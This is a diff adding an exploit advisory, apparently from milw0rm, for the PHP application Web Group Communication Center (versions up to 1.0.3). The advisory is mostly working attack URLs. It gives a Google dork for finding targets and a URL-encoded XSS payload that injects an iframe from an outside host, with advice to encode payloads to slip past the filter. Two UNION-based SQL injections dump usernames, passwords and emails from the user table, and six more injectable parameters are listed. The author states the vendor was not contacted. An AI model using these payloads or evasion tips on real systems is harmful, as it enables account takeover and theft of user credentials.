@@ -1,0 +1,33 @@
+*************************************************
+# Title   : Web Group Communication Center [XSS/SQL] Multiple Remote Vulnerabilies
+# Author  : myvx
+# Date    : 13.05.2008
+*************************************************
+# Application : Web Group Communication Center
+# Version     : <= 1.0.3 PreRelease #1
+# Vendor      :    http://wgcc.de/
+# Download    : http://wgcc.de/filebase/Geschuetzer_Bereich/wgcc_release_1_0_2.zip
+*************************************************
+# google dork : "Web Group Communication Center"
+
+Exploit:
+XSS:
+http://[target]/[path]/profile.php?action=show&userid=%22%3E%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%68%61%2E%63%6B%65%72%73%2E%6F%72%67%2F%73%63%72%69%70%74%6C%65%74%2E%68%74%6D%6C%3C
+
+To bypass the XSS-Filter urlencode your malicious Code.
+
+SQL-INJECTION(you must be logged in):
+http://[target]/[path]/profile.php?action=show&saction=moreinfo&userid=-1+UNION+SELECT+1,concat(username,0x3a,password,0x3a,email)+FROM+wgcc_user--
+or  http://[target]/[path]/profile.php?action=show&saction=moreinfo&userid=-1+UNION+SELECT+1,concat(username,0x3a,passwort,0x3a,email)+FROM+wgcc_user--
+
+more:
+http://[target]/[path]/picturegallery.php?action=shownext&bildid=[SQL-STATEMENT]
+http://[target]/[path]/filebase.php?action=freigeben&id=[SQL-STATEMENT]
+http://[target]/[path]/schedule.php?action=del&id=[SQL-STATEMENT]
+http://[target]/[path]/profile.php?action=observe&saction=del&id=[SQL-STATEMENT]
+http://[target]/[path]/message.php?action=delete&pmid=[SQL-STATEMENT]
+http://[target]/[path]/message.php?action=showfolder&folderid=[SQL-STATEMENT]
+
+The Vendor has not been contacted yet.
+
+# milw0rm.com [2008-05-13]
